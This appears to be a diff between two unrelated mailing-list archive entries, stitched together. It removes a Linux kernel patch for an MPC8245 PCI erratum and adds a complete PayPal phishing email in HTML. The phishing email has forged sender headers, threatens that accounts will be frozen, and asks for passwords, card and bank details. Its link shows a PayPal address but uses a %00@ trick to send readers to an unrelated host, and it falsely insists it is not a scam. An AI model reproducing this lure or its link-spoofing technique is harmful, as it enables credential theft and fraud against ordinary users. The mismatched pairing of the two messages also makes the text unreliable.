@@ -1,16 +1,23 @@
-Return-Path: <mgreer@mvista.com>
-Received: from av.mvista.com (gateway-1237.mvista.com [12.44.186.158])
-	by ozlabs.org (Postfix) with ESMTP id B8DAC67A85
+Return-Path: <cgi-mailer-bounces-88151836@kundenserver.de>
+Received: from moutng.kundenserver.de (moutng.kundenserver.de
+	[212.227.126.173]) by ozlabs.org (Postfix) with ESMTP id 444DD67A8D
 	for <linuxppc-embedded@ozlabs.org>;
-	Sat, 29 Jan 2005 08:27:45 +1100 (EST)
-Message-ID: <41FAAE4C.3060300@mvista.com>
-Date: Fri, 28 Jan 2005 14:27:40 -0700
-From: "Mark A. Greer" <mgreer@mvista.com>
+	Sat, 29 Jan 2005 09:27:44 +1100 (EST)
+Received: from [212.227.126.202] (helo=mrvnet.kundenserver.de)
+	by moutng.kundenserver.de with esmtp (Exim 3.35 #1)
+	id 1CueE0-0000Rq-00
+	for linuxppc-embedded@ozlabs.org; Fri, 28 Jan 2005 23:04:20 +0100
+Received: from [212.227.127.162] (helo=infong265 ident=8)
+	by mrvnet.kundenserver.de with smtp (Exim 3.35 #1)
+	id 1CueE0-0006CI-00
+	for linuxppc-embedded@ozlabs.org; Fri, 28 Jan 2005 23:04:20 +0100
+Date: Fri, 28 Jan 2005 23:04:20 +0100
+To: linuxppc-embedded@ozlabs.org
+From: service@paypal.com <service@paypal.com>
 MIME-Version: 1.0
-To: akpm <akpm@osdl.org>
-Content-Type: multipart/mixed; boundary="------------020707020608070004000400"
-Cc: Embedded PPC Linux list <linuxppc-embedded@ozlabs.org>
-Subject: [PATCH][PPC32] MPC8245 erratum 28 workaround
+Content-Type: text/html
+Message-Id: <E1CueE0-0006CI-00@mrvnet.kundenserver.de>
+Subject: Regarding Your Paypal Account
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -22,67 +29,242 @@ List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
 
-This is a multi-part message in MIME format.
---------------020707020608070004000400
-Content-Type: text/plain; charset=ISO-8859-1; format=flowed
-Content-Transfer-Encoding: 7bit
+<html>
+<head>
+<style type="text/css">
+dummy {}
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+LI {line-height: 120%;}
+UL.ppsmallborder {margin:10px 5px 10px 20px;}
+LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+UL.pp_narrow {margin:10px 5px 0px 40px;}
+pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}
+pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}
+pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}
+pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}
+pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+ppem106 {font-weight: 700;}
+style1 {color: #0000FF}
+style2 {
+font-size: 12px;
+font-weight: bold;
+}
+style3 {font-size: 14px}
+style4 {
+color: #FF0000;
+font-size: 16px;
+}
+style5 {font-size: 18px}
+style6 {font-family: verdana,arial,helvetica,sans-serif; font-size: 14px;
+font-weight: bold; color: #000000; }
+</style>
+<title>PayPal - Account System Cleanup Notice</title>
+</head>
+<body bgcolor="#ffffff">
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+<tr valign="top">
+<td><A href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" width=255
+height=35 alt="PayPal" border="0"></A>
+</td>
+</tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td background="http://images.paypal.com/images/bg_clk.gif"
+width=100%><img src="http://images.paypal.com/images/pixel.gif" height="29"
+width="1" border="0"></td>
+</tr>
+<tr>
+<td><img src="http://images.paypal.com/images/pixel.gif" height="10"
+width="1" border="0"></td>
+</tr>
+</table>
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+<tr valign="top">
+<td width="400">
+<table width="100%" cellspacing="0" cellpadding="5"
+border="0">
+<tr valign="top">
+<td>
+<table
+width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td align="left" class="pp_heading style5">Account System Cleanup </td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td><span class="style3"><span class="ppinlineerrorbold style2
+style4">IMPORTANT</span><br>
+Dear PayPal Member,</span> <p align="justify">Due to overwhelming reports of
+fraudulent transactions and account abuse, PayPal now requires all active
+members who have an account to verify that they rightfully own it.</p>
+<div align="justify">
+<p>You must <b>click the link below</b> and enter
+your email, password and reference code on the following page to verify your
+account. </p>
+<p>This is <strong>NOT a SCAM or HOAX</strong>. Please check your address bar
+to make sure you are on the authentic PayPal website.<br>
+</p>
+<table width="95%" cellpadding="1" cellspacing="0" border="0"
+bgcolor="#FFE65C" align=left>
+<tr>
+<td>
+<table width="100%" cellpadding="4" cellspacing="0" border="0"
+bgcolor="#FFFECD" align="center">
+<tr>
+<td class="pp_sansserif" align="center"><div align="center"><A
+href="http://www.paypal.com%00@do.syes.tp.edu.tw/bk/index.htm">https://www.paypal.com/accountcleanup/</a></div></td>
+</tr>
+</table></td>
+</tr>
+</table>
+<div align="justify">
+<p align="center"></p>
+</div>
+<p> </p>
+<p> <br>
+</p>
+</div>
+<div align="justify">
+<p align="center"><span class="style6"><BR><BR>Your reference code is :
+PPA-2546-5437</span></p>
+<p>You will be guided through a series of steps which will require you to
+enter personal information, such as credit card number and/or bank details.
+</p>
+<p><span class="style2">ALL accounts not re-verified within 5 days of
+receiving this email will be automatically frozen. </span></p>
+<p>PayPal is doing this to protect it's valued members from fraud and scams.
+Paypal will not share your personal information with other companies and
+corporations. <span class="style1"><a
+href="http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy
+Policy</a></span></p>
+</div>
+<p>Thank you for your co-operation,<br>
+PayPal</p> </td>
+</tr>
+<tr>
+<td><table cellpadding="0" cellspacing="0" border="0" align="center"
+bgcolor="#ffffff">
+<tr>
+<td><img src="http://images.paypal.com/en_US/i/scr/dot_row.gif"
+width="390" height="5"></td>
+</tr>
+</table>
 
-The 8241/8245 have an erratum where PCI reads from local memory may 
-return stale data.  One of the two workarounds is to set PICR2[0].  This 
-patch does that.
+</td>
+</tr>
+<tr>
+<td><table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+<td class="pp_footer">
+Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. Due to security reasons your name and personal information cannot be
+mentioned in this email. <br>
+<br class="h10">
+To receive email notifications in plain text instead of HTML, update
+your preferences <a href="https://www.paypal.com/us/PREFS-NOTI">here</a>.
+</td>
+</tr>
+<tr>
+<td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10"
+width="1" border="0"></td>
+</tr>
+</table>
 
-This patch assumes that the previous mpc10x patch has been applied.
+</td>
+</tr>
+</table>
+</td>
+<td><img src="" height="1"
+width="10" border="0"></td>
+<td width="190" valign="top">
+<table width="100%" cellspacing="0" cellpadding="1" border="0"
+bgcolor="#cccccc">
+<tr>
+<td>
+<table width="100%" cellspacing="0"
+cellpadding="0" border="0" bgcolor="#ffffff">
+<tr>
+<td><table width="100%" cellspacing="0"
+cellpadding="5" border="0" bgcolor="#eeeeee">
+<tr>
+<td class="pp_sidebartextbold" align="center">Protect Your Account
+Info</td>
+</tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="5" border="0">
+<tr>
+<td class="pp_sidebartext">A genuine PayPal link will <span
+class="ppem106">always</span> begins with
+"http://www.paypal.com"<br><br>Remember to check your browser's
+Address/URL Bar to be sure you are on an authentic PayPal site.<br><br>Please
+make sure the link you click on starts with
+"https://www.paypal.com"<br><br><span class="ppsmalltext">Paypal will <span
+class="ppem106">never</span> ask for sensitive information. PayPal sites that
+ask for Passport information, Driver's licence details are definitely
+scams.</span><br><br> For more information on protecting yourself from fraud,
+please visit the <a
+href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/fraud-prevention-outside">Security
+Center</a>.<br><img src="http://%3%/images/pixel.gif"
+height="5" width="1" border="0"></td>
+</tr>
+</table>
 
-Signed-off-by: Mark A. Greer <mgreer@mvista.com>
---
 
---------------020707020608070004000400
-Content-Type: text/plain;
- name="mpc10x_2.patch"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline;
- filename="mpc10x_2.patch"
-
-diff -Nru a/arch/ppc/syslib/mpc10x_common.c b/arch/ppc/syslib/mpc10x_common.c
---- a/arch/ppc/syslib/mpc10x_common.c	2005-01-28 14:23:25 -07:00
-+++ b/arch/ppc/syslib/mpc10x_common.c	2005-01-28 14:23:25 -07:00
-@@ -323,6 +323,24 @@
- 			MPC10X_CFG_PICR1_REG, picr1);
- 	}
- 
-+	/*
-+	 * 8241/8245 erratum 28: PCI reads from local memory may return
-+	 * stale data.  Workaround by setting PICR2[0] to disable copyback
-+	 * optimization.  Oddly, the latest available user manual for the
-+	 * 8245 (Rev 2., dated 10/2003) says PICR2[0] is reserverd.
-+	 */
-+	if (host_bridge == MPC10X_BRIDGE_8245) {
-+		ulong	picr2;
-+
-+		early_read_config_dword(hose, 0, PCI_DEVFN(0,0),
-+			MPC10X_CFG_PICR2_REG, &picr2);
-+
-+		picr2 |= MPC10X_CFG_PICR2_COPYBACK_OPT;
-+
-+		early_write_config_dword(hose, 0, PCI_DEVFN(0,0),
-+			 MPC10X_CFG_PICR2_REG, picr2);
-+	}
-+
- 	if (ppc_md.progress) ppc_md.progress("mpc10x:exit", 0x100);
- 	return 0;
- }
-diff -Nru a/include/asm-ppc/mpc10x.h b/include/asm-ppc/mpc10x.h
---- a/include/asm-ppc/mpc10x.h	2005-01-28 14:23:25 -07:00
-+++ b/include/asm-ppc/mpc10x.h	2005-01-28 14:23:25 -07:00
-@@ -108,6 +108,9 @@
- #define	MPC10X_CFG_PICR1_SPEC_PCI_RD	0x00000004
- #define	MPC10X_CFG_PICR1_ST_GATH_EN	0x00000040
- 
-+#define	MPC10X_CFG_PICR2_REG		0xac
-+#define	MPC10X_CFG_PICR2_COPYBACK_OPT	0x00000001
-+
- #define	MPC10X_CFG_MAPB_OPTIONS_REG	0xe0
- #define	MPC10X_CFG_MAPB_OPTIONS_CFAE	0x80	/* CPU_FD_ALIAS_EN */
- #define	MPC10X_CFG_MAPB_OPTIONS_PFAE	0x40	/* PCI_FD_ALIAS_EN */
-
---------------020707020608070004000400--
+</td>
+</tr>
+<tr>
+<td><table width="100%" cellspacing="0"
+cellpadding="5" border="0" bgcolor="#eeeeee">
+<tr>
+<td class="pp_sidebartextbold" align="center">Protect Your Password</td>
+</tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="5" border="0">
+<tr>
+<td class="pp_sidebartext">You should <span class="ppem106">never</span>
+give your PayPal password to anyone, including PayPal employees.<br><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="5" width="1"
+border="0"></td>
+</tr>
+</table>
+</td>
+</tr>
+</td>
+</table>
+</td>
+</table>
+</td>
+</tr>
+</table>
+</body>
+</html>
